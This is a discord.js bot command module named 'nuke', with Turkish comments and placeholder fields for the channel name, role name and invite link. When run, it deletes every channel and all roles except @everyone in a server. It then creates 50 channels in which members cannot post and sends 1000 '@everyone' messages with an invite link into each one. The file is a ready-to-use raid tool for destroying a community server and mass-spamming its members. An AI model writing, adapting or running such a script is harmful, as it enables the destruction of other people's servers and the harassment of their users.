module.exports.run = async (client, message, args) => {
    var channelNames =  ["KANAL İSMİ YAZ"]; // buraya istediğiniz kadar kanal adı girin

    // Sunucudaki tüm kanalları siler
    message.guild.channels.cache.forEach(channel => channel.delete().catch(console.error));

    
    message.guild.roles.cache.forEach(role => {
        if(role.name !== "@everyone") {
            role.delete().catch(console.error); 
        }
    });

    // Sadece 1 tane rol oluşturuyoruz
    message.guild.roles.create({ 
        name: "AÇILACAK ROLÜN İSMİNİ YAZ",
        reason: "Rol komut ile oluşturuldu"
    }).catch(console.error);

    // Kanalları açıp spam mesaj atma kısmı
    for(let i = 0; i < 50; i++) {
        var number = Math.floor(Math.random() * channelNames.length);
        var channelName = channelNames[number];
        message.guild.channels.create(channelName, {
            type: "GUILD_TEXT", // discord.js v13+ için text kanalı
            permissionOverwrites: [
                {
                    id: message.guild.roles.everyone,
                    deny: ["SEND_MESSAGES"]
                }
            ],
        }).then(channel => {
            for(let j = 0; j < 1000; j++) { /// süreyi elleme
                channel.send({ content: "@everyone https://discord.gg/SUNUCULİNK" }); // mesaj içeriğini buraya yazın
            }
        }).catch(console.error);
    }
}

module.exports.help = {
    name: "nuke"
}
